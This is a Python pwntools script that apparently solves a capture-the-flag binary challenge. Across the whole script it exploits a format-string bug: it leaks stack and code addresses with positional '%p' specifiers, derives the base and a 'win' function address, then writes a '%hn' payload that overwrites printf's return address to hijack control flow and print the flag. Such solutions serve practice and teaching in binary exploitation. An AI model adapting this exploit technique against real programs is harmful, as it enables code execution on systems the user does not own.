from pwn import *

context.binary = './challenge'
context.log_level = 'info'

def solve():
    if args.REMOTE:
        p = remote('localhost', 1337)
    else:
        p = process('./challenge')

    # Pass 1: Leak
    p.recvuntil(b'> ')
    p.sendline(b'1')
    p.recvuntil(b'Transmit data: ')
    p.sendline(b'%1$p %25$p')
    p.recvuntil(b'The archives echo back: ')
    leaks = p.recvline().strip().split()
    buf_addr = int(leaks[0], 16)
    main_leak = int(leaks[1], 16)
    
    print(f"Buf: {hex(buf_addr)}")
    print(f"Main: {hex(main_leak)}")
    
    base_addr = main_leak - 0x10e0
    win_addr = base_addr + 0x1320
    print(f"Win: {hex(win_addr)}")
    
    # Target: printf return address
    # buf is at rsp+0x10 (in main)
    # printf ret is at rsp-0x8 (in main/printf call)
    # diff = 0x18
    target_addr = buf_addr - 0x18
    print(f"Target: {hex(target_addr)}")
    
    # Pass 2: Overwrite
    p.recvuntil(b'> ')
    p.sendline(b'1')
    p.recvuntil(b'Transmit data: ')
    
    val = win_addr & 0xFFFF
    part1 = f"%{val}c%10$hn".encode()
    padding = b'A' * (16 - len(part1))
    payload = part1 + padding + p64(target_addr)
    
    p.sendline(payload)
    
    try:
        data = p.recvall(timeout=2)
        print("Output found!")
        if b'Get yo flag' in data:
            print(data.split(b'Get yo flag')[1].decode(errors='ignore'))
        else:
            print(data[-200:])
    except:
        pass

if __name__ == "__main__":
    solve()
